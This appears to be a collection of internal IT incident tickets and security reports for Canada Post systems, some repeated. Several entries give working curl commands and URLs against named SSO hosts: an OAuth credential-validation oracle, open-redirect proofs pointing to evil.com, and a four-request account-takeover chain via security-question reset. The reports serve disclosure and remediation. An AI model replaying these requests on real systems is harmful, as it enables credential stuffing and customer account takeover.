Issue Description : AppDynamics generated a critical health rule violation for application cco-identitybackend-ibe-jsb-svc-prd under alert CPU-ErrorPercent-AvgResponseTime. The alert was triggered due to an increase in average response time above the configured AppDynamics baseline. Investigation showed slow-running database operations involving SSO_OWNER.PROOFING_PROFILE, including SELECT queries, UPDATE statements, and the procedure MOVE_DELETED_PROOFING_RECORDS. The alert later ended/cleared in AppDynamics.

Impact to Business : No customer complaints were received during the incident window. The application was running fine from a functional/service availability perspective, and no complete application outage was observed. No data loss was reported. The impact was limited to AppDynamics-detected performance degradation due to elevated response time for database-dependent transactions.

Root Cause / Likely Cause : DBA analysis confirmed there was no database CPU, memory, storage, or infrastructure bottleneck. The likely cause was inefficient database access on SSO_OWNER.PROOFING_PROFILE. Application queries primarily filter on CPC_ID, but the existing primary key index is defined as PROOFING_PROFILE_PK (DSS_ID, CPC_ID). Since CPC_ID is not the leading column, Oracle used an inefficient INDEX SKIP SCAN, causing excessive logical reads and slower query response times. AWR analysis showed approximately 1.38 billion logical reads, accounting for nearly 94% of total logical reads. Additionally, row-lock contention was observed on PROOFING_PROFILE, likely due to overlap between application UPDATE operations and the MOVE_DELETED_PROOFING_RECORDS procedure, which performs DML operations on the same table.

Resolution Action Taken : DBA performed AWR analysis, reviewed SQL execution statistics, analyzed execution plans, verified index usage, reviewed locking waits, and assessed table/index statistics. DBA confirmed that affected queries are using INDEX SKIP SCAN on the existing primary key and recommended evaluating a dedicated index on SSO_OWNER.PROOFING_PROFILE with CPC_ID as the leading column. No immediate production database change was implemented. The AppDynamics alert ended/cleared, and application service remained operational. Further action will be handed over to Development/Non-Production teams for evaluation and testing of the proposed indexing strategy before any production implementation.

Validation Steps Performed / QA : DBA validated the issue through AWR reports, SQL statistics, execution plan review, index access path analysis, locking wait review, and table statistics assessment. It was confirmed that the slow queries were using INDEX SKIP SCAN and that row-lock contention was present during the incident window. From the application side, no customer complaints or functional outage were observed, and the AppDynamics alert eventually ended. Further QA validation is required to confirm whether the proposed CPC_ID-leading index improves query performance and does not negatively impact INSERT/UPDATE/DELETE operations.

Preventive Measures : Evaluate and implement a dedicated CPC_ID-leading index on SSO_OWNER.PROOFING_PROFILE after proper validation. Review application query patterns to ensure indexes align with commonly used predicates. Review concurrency between application UPDATE operations and MOVE_DELETED_PROOFING_RECORDS to reduce row-lock contention. Consider scheduling, batching, or redesigning the procedure if it overlaps with user-facing application activity. Enhance monitoring for database response time, slow SQL count, row-lock waits, and AppDynamics backend latency.

We want to use the Canada Post Manage Returns Policy to allow our customers to generate a QR code to bring to the post office, along with their boxed goods for return.

Core Mailing and Shipping service is down

Mail and Ship services are currently unavailable due to an SSL certificate mismatch on the DataPower server. The certificate presented for soa-gw-01.cpggpc.ca does not match the configured subject alternative name, which is listed as soa-gw-lb-01.cpggpc.ca.

The DataPower and Wipro teams are actively investigating and working to resolve the certificate issue.



Resolution



Support teams are focusing on a possible certificate issue. Specifically, the DataPower team has successfully updated the soa-gw-01.cpggpc.ca certificate to include the additional Subject Alternative Name (SAN), ensuring the certificate supports the required hostname configuration.



The team confirmed that the service outage was effectively resolved at 11:20 following the successful implementation of the corrective action, which restored normal traffic flow. By 11:42, the secondary system was fully operational and handling production traffic.
The team is now reviewing any impacted processes, batch jobs, and dependent services, to ensure all applications and services remain stable and fully functional.

Background: This was a known issue that was resolved last year. And we saw significant improvements but we are now seeing a relapse.

Users are reporting repeated logout/session interruptions in the Canada Post mobile app. Survey verbatims indicate iPhone users are being logged out unexpectedly or kicked out while using the app. Customers expect the app to keep them signed in until they manually log out. No Android examples were visible in the available survey data for this specific issue.

Comments:

“I'm waiting for a package and I keep getting kicked out. App should keep me logged in until I log out.”
“It keeps logging me out. It never did that before.”
"Too much logging in.”
“I keep getting logged out.”

Background: This was a known issue that was resolved last year. And we saw significant improvements but we are now seeing a relapse.

Users are reporting repeated logout/session interruptions in the Canada Post mobile app. Survey verbatims indicate iPhone users are being logged out unexpectedly or kicked out while using the app. Customers expect the app to keep them signed in until they manually log out. No Android examples were visible in the available survey data for this specific issue.

Comments:

“I'm waiting for a package and I keep getting kicked out. App should keep me logged in until I log out.”
“It keeps logging me out. It never did that before.”
"Too much logging in.”
“I keep getting logged out.”

Meeting was held with Patrick C. Dennis F (CPC), Don Neelin (CPC), Paul B and John McCormick. on July 29th 2026.

Meeting Minutes below.

The purpose of the meeting was to review the previously backed-out Website authentication change that disabled the deprecated grant_type=password functionality, understand the cause of the resulting customer profile exposure issue, discuss options for safely reimplementing the change, and identify interim risk mitigation measures to address the ongoing brute force attack exposure

•   Link to Meeting Transcript 
• Link to Meeting Recording

Key Discussion Points

• A change to disable a deprecated authentication method was rolled back after it caused users to see other customers' profile information; the issue was linked to unintended impacts on session initialization and user session handling.
• The team confirmed the deprecated grant_type=password authentication method presents a security risk by potentially bypassing MFA controls, and its removal would eliminate a current brute-force attack vector while aligning the platform with supported security standards.
• The team identified upgrading the Website platform from Version 10.07 to the vendor-supported Version 11.2 as a priority to remove legacy dependencies, maintain IBM support, and reduce risk associated with future authentication security enhancements.

Challenges implementing the backed-out Change (CHG0041850)

• The team identified technical challenges that must be addressed before the authentication change can be reintroduced, including ensuring proper session initialization, updating token handling logic, and validating mobile application dependencies on the deprecated authentication method.
• The team identified ongoing supportability risks due to the Website environment operating on an unsupported version, and agreed that upgrading to Version 11 prior to reimplementing the authentication change is the lowest-risk approach to ensure vendor support and reduce potential operational impacts.
• The team acknowledged that no firm implementation timeline has been established, with upgrade activities, architectural changes, testing, and deployment expected to require several weeks before the authentication security change can be safely reintroduced

Potential Alternative Solutions for Investigations

• Option 1 – Reattempt the Change with Full Platform Restart
o A proposal was put forward to reintroduce the authentication change following a full website restart and enhanced monitoring to determine whether the previous customer profile exposure issue was caused by the change itself or by an existing platform state condition.
• Option 2 – Restrict Deprecated Authentication to Approved Mobile Applications
o The team discussed a temporary mitigation that would restrict the deprecated grant_type=password authentication method to approved mobile application fingerprints, reducing exposure while longer-term remediation and platform modernization activities are completed.
• Option 3 – IP Reputation Filtering
o The team discussed leveraging IP reputation intelligence to restrict access from high-risk and known malicious sources, providing an additional layer of protection against brute-force attacks while recognizing that it would serve as a mitigating control rather than a complete solution to the underlying security risk.
• Option 4 – WAF-Based Mitigation
o The team agreed to assess CloudWatch and WAF telemetry to determine current exploitation activity and implement interim WAF controls, including JA3/JA4 fingerprint-based restrictions, to reduce exposure to the vulnerable authentication path while the long-term platform upgrade is progressed.

Action Items / Next Steps

Confirm Website Version 11.2 upgrade plan, prerequisites, and timeline upon Antoine's return. Patrick / Anh-Tuan
Review IBM recommendations regarding token script updates and session initialization requirements. Patrick / Anh-Tuan
Assess feasibility of reattempting the grant_type=password removal with full platform reboot and enhanced monitoring. Patrick / Anh-Tuan
Investigate JA3/JA4 fingerprint whitelisting for approved mobile applications. Patrick / Anh-Tuan
Engage mobile application team to determine fingerprint management requirements and update process. Website Team / Mobile Team
Review possibility of implementing IP reputation-based protections. Website Team
Schedule follow-up meeting after Antoine's return to review findings, timelines, and implementation strategy. John McCormick

Review meeting was held with Anh-Tuan, Paul B. and Dennis F. to review the vulnerabilities. b elow is the details of that call whci have already been provided to the meeting invitees.

Key Discussion Points

• Security has confirmed the endpoint is under active attack, with threat actors using stolen credentials from public data breaches and deliberately rotating IP addresses while making low volume login attempts per account to avoid triggering standard lockout controls.
• Account lockout controls by themselves do not prevent credential stuffing attacks, because attackers deliberately make only one or two login attempts across many different accounts, staying below lockout thresholds, and any valid stolen credential allows immediate access regardless of how strict the lockout policy is.
• MFA lowers the risk of stolen credentials being used, but it does not fully protect this endpoint unless MFA is specifically enforced there, leaving the endpoint exposed as an attack vector even after MFA is deployed elsewhere.
• The core problem is how the endpoint behaves: it responds differently based on the input, which allows attackers to identify valid usernames, tell valid and invalid credentials apart, and potentially obtain a JWT/token—raising concern about what level of access that token grants and how it can be abused.
• The authentication approach needs to be reworked so the endpoint cannot be accessed using direct username and password flows, only through a secure authorization code process with tightly restricted permissions, ensuring that access is granted solely to properly authenticated user sessions and not usable as a standalone entry point for attackers.
• It is currently unclear whether this endpoint behavior was previously accepted as a business risk, and follow up is needed. Paul B has engaged the Security Risk team to review if this vulnerability has been previously remediated. 

Mitigation controls required to reduce vulnerability risk level.

• Rate limiting should be strengthened beyond basic IP controls by using additional signals such as device fingerprinting, user agent patterns, and behavioral request rate analysis to detect and block large scale automated activity, with the goal of preventing high volume credential stuffing attempts even when attackers rotate IP addresses.
• The endpoint should be updated to always return the same generic response for any authentication failure—whether the username is invalid, the password is wrong, or another error occurs—so attackers cannot use response differences to identify valid accounts or credentials.

Items to Be Reviewed and Potentially Remediated

To fully address the vulnerability, the following must be reviewed and remediated as applicable:
• Endpoint Design Review
o Why the endpoint exists
o What functionality is strictly required
o Whether it should be accessible anonymously or only after authenticated session establishment
• Token (JWT) Handling
o What the returned token authorizes
o Whether token issuance can be restricted, delayed, or moved server side
o Reduce token usefulness if compromised
• OAuth / Grant Configuration
o Disable password grant types where not strictly required
o Enforce authorization code flow with proper scopes
o Validate client IDs and scopes align strictly with intended use cases
• Authentication Flow Hardening
o Require a valid session, prior authentication step, or additional context before this endpoint can be called
o Remove any behavior that allows unauthenticated probing
• MFA Integration (Longer Term)
o Ensure MFA enforcement aligns with all relevant authentication flows
o Validate no alternate paths bypass MFA once implemented

Next steps

1. Immediate mitigations to be defined and implemented to reduce active abuse.
2. Business risk acceptance to be confirmed prior to adjusting incident severity
3. Web Tech team to investigate endpoint and OAuth configuration changes.

column48:
The absence of rate-limiting via /mga/sps/oauth/oauth20/token allows an attacker to enumerate valid user credentials. This is actively being exploited / has been exploited in the past. DO NOT rely on IP base rate limiting as a mitigation as threat actors have demonstrated to easily bypass that.

Pre-conditions
Any internet-connected attacker with HTTPS access to www.canadapost-postescanada.ca
Attacker holds a credential list (breach dump or intent to brute-force)
No session, cookies, or prior authentication required

Steps to Reproduce

Step 1 — Valid credentials → fresh bearer + signed id_token (no reCAPTCHA required)
curl -sk -X POST \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Accept: application/json' \
  --data-urlencode 'grant_type=password' \
  --data-urlencode 'username=$TEST2_EMAIL' \
  --data-urlencode "password=$TEST2_PASSWORD" \
  --data-urlencode 'client_id=profile2' \
  --data-urlencode 'scope=openid' \
  'https://www.canadapost-postescanada.ca/mga/sps/oauth/oauth20/token'

Response:

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"access_token":"[REDACTED]",
 "refresh_token":"[REDACTED]",
 "id_token":"eyJraWQiOiJF...[REDACTED]",
 "scope":"openid",
 "token_type":"bearer",
 "expires_in":1799}

A signed JWT id_token with user claims is issued. No g-recaptcha-response or reCAPTCHA cookie was sent in this request.

Step 2 — Invalid password → distinguishable error (credential-validation oracle)
curl -sk -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=password' \
  --data-urlencode 'username=$TEST2_EMAIL' \
  --data-urlencode 'password=WRONG_PASSWORD_XYZ' \
  --data-urlencode 'client_id=profile2' \
  'https://www.canadapost-postescanada.ca/mga/sps/oauth/oauth20/token'

Response:

HTTP/1.1 400 Bad Request
{"error_description":"Invalid username or password. LFE Authentication failed.","error":"mapping_error"}

Distinct from invalid client_id error, providing two separate oracles:

curl ... --data-urlencode 'client_id=doesntexist' ...
# => 400 {"error_description":"FBTOAU203E The client identifier could not be found.","error":"invalid_client"}

An attacker can script this and enumerate user credentials.

Review meeting was held with Anh-Tuan, Paul B. and Dennis F. to review the vulnerabilities. b elow is the details of that call whci have already been provided to the meeting invitees.

Key Discussion Points

• Security has confirmed the endpoint is under active attack, with threat actors using stolen credentials from public data breaches and deliberately rotating IP addresses while making low volume login attempts per account to avoid triggering standard lockout controls.
• Account lockout controls by themselves do not prevent credential stuffing attacks, because attackers deliberately make only one or two login attempts across many different accounts, staying below lockout thresholds, and any valid stolen credential allows immediate access regardless of how strict the lockout policy is.
• MFA lowers the risk of stolen credentials being used, but it does not fully protect this endpoint unless MFA is specifically enforced there, leaving the endpoint exposed as an attack vector even after MFA is deployed elsewhere.
• The core problem is how the endpoint behaves: it responds differently based on the input, which allows attackers to identify valid usernames, tell valid and invalid credentials apart, and potentially obtain a JWT/token—raising concern about what level of access that token grants and how it can be abused.
• The authentication approach needs to be reworked so the endpoint cannot be accessed using direct username and password flows, only through a secure authorization code process with tightly restricted permissions, ensuring that access is granted solely to properly authenticated user sessions and not usable as a standalone entry point for attackers.
• It is currently unclear whether this endpoint behavior was previously accepted as a business risk, and follow up is needed. Paul B has engaged the Security Risk team to review if this vulnerability has been previously remediated. 

Mitigation controls required to reduce vulnerability risk level.

• Rate limiting should be strengthened beyond basic IP controls by using additional signals such as device fingerprinting, user agent patterns, and behavioral request rate analysis to detect and block large scale automated activity, with the goal of preventing high volume credential stuffing attempts even when attackers rotate IP addresses.
• The endpoint should be updated to always return the same generic response for any authentication failure—whether the username is invalid, the password is wrong, or another error occurs—so attackers cannot use response differences to identify valid accounts or credentials.

Items to Be Reviewed and Potentially Remediated

To fully address the vulnerability, the following must be reviewed and remediated as applicable:
• Endpoint Design Review
o Why the endpoint exists
o What functionality is strictly required
o Whether it should be accessible anonymously or only after authenticated session establishment
• Token (JWT) Handling
o What the returned token authorizes
o Whether token issuance can be restricted, delayed, or moved server side
o Reduce token usefulness if compromised
• OAuth / Grant Configuration
o Disable password grant types where not strictly required
o Enforce authorization code flow with proper scopes
o Validate client IDs and scopes align strictly with intended use cases
• Authentication Flow Hardening
o Require a valid session, prior authentication step, or additional context before this endpoint can be called
o Remove any behavior that allows unauthenticated probing
• MFA Integration (Longer Term)
o Ensure MFA enforcement aligns with all relevant authentication flows
o Validate no alternate paths bypass MFA once implemented

Next steps

1. Immediate mitigations to be defined and implemented to reduce active abuse.
2. Business risk acceptance to be confirmed prior to adjusting incident severity
3. Web Tech team to investigate endpoint and OAuth configuration changes.

1. Issue Summary and Business Impact
Alert triggered indicating emails were not being sent after label creation in SnapShip. No actual business impact — emails were functioning correctly during active usage.

2. Diagnostics Performed
Reviewed email trigger logs for the affected period to confirm send activity and identify gaps.

3. Root Cause (or Likely Cause)
No defect identified. The alert fired because of the P1 INC0381003 related to getDistRate which had intterupted users fromcreating labels, resulting in zero email triggers — expected behaviour, not a failure.

4. Resolution
No code or configuration change required. Confirmed the system is working as designed; emails are triggered successfully when labels are created after the P1 is resolved

5. Validation / Testing Performed
Verified email logs showing successful triggers during active label creation periods. Alert count (Number of Hits: 0) aligns with no label activity during the flagged window.

================================
Hello,

We need help linking our commercial customer number to our Developer Portal organization. Production calls to the Rating API are being rejected, and the portal does not let us fix the link ourselves.

Details:

- Organization title: LA-LUNAR-PRINTING-INC
- Organization ID: 94b9d275-4db0-4403-97cb-52ff5d3caaba

Symptoms:

- POST /rating/v1/prices in production returns HTTP 403 with an empty body when the request includes customerNumber "0001297153".

- OAuth token requests succeed for both our test and production credentials, and the sandbox Rating API works with our test app.
- In the portal, the app-level "Customer number" field is disabled, the organization page has no edit option for the customer number, and "Register an organization" redirects back to the portal home without offering to add the number.

Request: please link customer number 0001297153 to organization LA-LUNAR-PRINTING-INC (ID above) so that production Rating API calls are authorized.

Thank you,
Jia Jun Guan
LA LUNAR PRINTING INC.

All detected traffic during the analysis window was consistent with active probing and reconnaissance activity, aimed at confirming whether the target environment is susceptible to open redirect exploitation. No evidence of successful exploitation or malicious payload delivery was identified at this time.

The observed requests were characteristic of automated vulnerability scanning and manual probing techniques, including:
- Generic redirect probing using placeholder destinations such as example domains and OOB interaction servers (e.g., Burp Collaborator)
- Cross-Site Scripting (XSS) injection attempts embedded within redirect parameters
- Path traversal sequences appended to the targetUrl parameter

While no active exploitation has been confirmed, the nature of the observed traffic indicates that the vulnerability has been identified and validated by external parties. The environment should be treated as a confirmed target for potential follow-on attacks. The most likely next step from an attacker's perspective would be using the vulnerable domains as a trusted launchpad for phishing — where victims see legitimate domain in the URL but get redirected to a malicious site. 
Immediate remediation of the open redirect vulnerability on affected hosts is recommended, alongside continued monitoring for phishing infrastructure or lookalike domains leveraging the organization's domain as a redirect launcher.

stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca are vulnerable to an Open Redirect vulnerability.

Proof of concepts (all will redirect the user to evil.com or a subdomain of evil.com):
https://stg001-sso.epost.ca/pkmslogout?targetUrl=https://evil.com/?canadapost-postescanada.ca

https://stg001-sso.epost.ca/pkmslogout?targetUrl=https://canadapost-postescanada.ca.evil.com/

https://stg001-sso.epost.ca/pkmslogout?targetUrl=https://evil.com/canadapost-postescanada.ca

The proof of concepts work in stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca environments.

Please investigate whether this has or is being exploited. Before closing the incident (for any reason), please provide the date and time + IP addresses that executed the PoC to ensure logging is capturing events accordingly. Please implement a mitigation and alerting to prevent future exploitation.

All detected traffic during the analysis window was consistent with active probing and reconnaissance activity, aimed at confirming whether the target environment is susceptible to open redirect exploitation. No evidence of successful exploitation or malicious payload delivery was identified at this time.

The observed requests were characteristic of automated vulnerability scanning and manual probing techniques, including:
- Generic redirect probing using placeholder destinations such as example domains and OOB interaction servers (e.g., Burp Collaborator)
- Cross-Site Scripting (XSS) injection attempts embedded within redirect parameters
- Path traversal sequences appended to the targetUrl parameter

While no active exploitation has been confirmed, the nature of the observed traffic indicates that the vulnerability has been identified and validated by external parties. The environment should be treated as a confirmed target for potential follow-on attacks. The most likely next step from an attacker's perspective would be using the vulnerable domains as a trusted launchpad for phishing — where victims see legitimate domain in the URL but get redirected to a malicious site. 
Immediate remediation of the open redirect vulnerability on affected hosts is recommended, alongside continued monitoring for phishing infrastructure or lookalike domains leveraging the organization's domain as a redirect launcher.

All detected traffic during the analysis window was consistent with active probing and reconnaissance activity, aimed at confirming whether the target environment is susceptible to open redirect exploitation. No evidence of successful exploitation or malicious payload delivery was identified at this time.

The observed requests were characteristic of automated vulnerability scanning and manual probing techniques, including:
- Generic redirect probing using placeholder destinations such as example domains and OOB interaction servers (e.g., Burp Collaborator)
- Cross-Site Scripting (XSS) injection attempts embedded within redirect parameters
- Path traversal sequences appended to the targetUrl parameter

While no active exploitation has been confirmed, the nature of the observed traffic indicates that the vulnerability has been identified and validated by external parties. The environment should be treated as a confirmed target for potential follow-on attacks. The most likely next step from an attacker's perspective would be using the vulnerable domains as a trusted launchpad for phishing — where victims see legitimate domain in the URL but get redirected to a malicious site. 
Immediate remediation of the open redirect vulnerability on affected hosts is recommended, alongside continued monitoring for phishing infrastructure or lookalike domains leveraging the organization's domain as a redirect launcher.

https://stg001-sso.epost.ca/pkmslogout?targetUrl=https://evil.com/?canadapost-postescanada.ca

https://stg001-sso.epost.ca/pkmslogout?targetUrl=https://evil.com/canadapost-postescanada.ca

The proof of concepts work in stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca environments.

Please investigate whether this has or is being exploited. Before closing the incident (for any reason), please provide the date and time + IP addresses that executed the PoC to ensure logging is capturing events accordingly. Please implement a mitigation and alerting to prevent future exploitation.

All detected traffic during the analysis window was consistent with active probing and reconnaissance activity, aimed at confirming whether the target environment is susceptible to open redirect exploitation. No evidence of successful exploitation or malicious payload delivery was identified at this time.

The observed requests were characteristic of automated vulnerability scanning and manual probing techniques, including:
- Generic redirect probing using placeholder destinations such as example domains and OOB interaction servers (e.g., Burp Collaborator)
- Cross-Site Scripting (XSS) injection attempts embedded within redirect parameters
- Path traversal sequences appended to the targetUrl parameter

While no active exploitation has been confirmed, the nature of the observed traffic indicates that the vulnerability has been identified and validated by external parties. The environment should be treated as a confirmed target for potential follow-on attacks. The most likely next step from an attacker's perspective would be using the vulnerable domains as a trusted launchpad for phishing — where victims see legitimate domain in the URL but get redirected to a malicious site. 
Immediate remediation of the open redirect vulnerability on affected hosts is recommended, alongside continued monitoring for phishing infrastructure or lookalike domains leveraging the organization's domain as a redirect launcher.

Note: the vulnerability affects both sso-osu.canadapost-postescanada.ca and sso.epost.ca (both providing production data). Additionally, the endpoints accept an empty postalCode and returns the security question to anyone who supplies the email. No CAPTCHA, no rate-limit on this discovery step. The /username-recovery can be used to enumerate a valid security question answer.

A vulnerability has been discovered in the Canada Post SSO system where an attacker can achieve complete account takeover using only the victim's email address and a single knowledge-based authentication (KBA) answer, bypassing all security controls without requiring victim interaction or email access.

Affected Asset
The affected asset is the Canada Post staging SSO platform at stg003-sso.epost.ca, specifically the following endpoints:

/lfe-cap/rs/username-recovery - Username recovery endpoint
/lfe-cap/rs/password/reset - Password reset endpoint
/mga/sps/oauth/oauth20/token - OAuth token endpoint


Steps to Reproduce
1. Set up the required headers for all requests:

Accept: application/vnd.cpg.lfe-v2.0+json
Content-Type: application/vnd.cpg.lfe-v2.0+json
Origin: https://sso-osu.canadapost-postescanada.ca

Retrieve the security question using email-only username recovery:

curl -ksS --http2 'https://sso.epost.ca/lfe-cap/rs/username-recovery' \
  -H 'Accept: application/vnd.cpg.lfe-v2.0+json' \
  -H 'Content-Type: application/vnd.cpg.lfe-v2.0+json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://sso-osu.canadapost-postescanada.ca' \
  -d '{"email":"victim@email.com","postalCode":""}'

Response reveals the security question: {"status":"10","secretQuestion":"First city visited?"}

Recover the username by providing the security answer:

curl -ksS --http2 'https://sso.epost.ca/lfe-cap/rs/username-recovery' \
  -H 'Accept: application/vnd.cpg.lfe-v2.0+json' \
  -H 'Content-Type: application/vnd.cpg.lfe-v2.0+json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://sso-osu.canadapost-postescanada.ca' \
  -d '{"email":"victim@email.com","postalCode":"","secretQuestion":"First city visited?","secretAnswer":"Toronto"}'


Response returns the username: {"status":"50","username":"victim_user"}

Reset the password using the same KBA answer:

curl -ksS --http2 'https://sso.epost.ca/lfe-cap/rs/password/reset' \
  -H 'Accept: application/vnd.cpg.lfe-v2.0+json' \
  -H 'Content-Type: application/vnd.cpg.lfe-v2.0+json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://sso-osu.canadapost-postescanada.ca' \
  -d '{"username":"victim_user","secretQuestion":"Where parents met?","secretAnswer":"Toronto","password":"AttackerChosen#1!"}'

Response confirms password reset: {"status":"50"}

Authenticate with the new attacker-chosen password:

curl -ksS --http2 'https://sso.epost.ca/mga/sps/oauth/oauth20/token' \
  -d 'grant_type=password&client_id=cpc-nativeapp-2020&username=victim_user&password=AttackerChosen%231!&scope=openid'

Response returns valid OAuth tokens, confirming account takeover.

Verify the original password no longer works:

curl -ksS --http2 'https://sso.epost.ca/mga/sps/oauth/oauth20/token' \
  -d 'grant_type=password&client_id=cpc-nativeapp-2020&username=victim_user&password=WhoShotYa123!&scope=openid'

Response returns authentication error, confirming password rotation.

Impact
An attacker can completely take over any Canada Post customer account using only the victim's email address and a single OSINT-discoverable security answer through approximately four HTTP requests. The attack requires no victim interaction, no email access, no CAPTCHA solving, and no rate limiting restrictions. The successful takeover results in:

- Complete account lockout for the legitimate user due to password rotation
- Access to personal identifiable information (PII) through profile endpoints
- Exposure of plaintext security answers and MFA configuration
- Valid OAuth bearer tokens that authenticate against any service trusting the production CIAM identity
- The ability to perform a persistent denial-of-service attack through the 3-strike lockout mechanism on the password reset endpoint
- The vulnerability affects the production identity backend as confirmed by the LDAP distinguished name dc=canadapost,dc=ca in the issued JWT tokens, indicating production-scope impact. 

Additional related vulnerabilities include plaintext security answer disclosure, unauthenticated customer PII exposure, stored XSS in address fields, and mass-assignable KBA fields through profile updates.
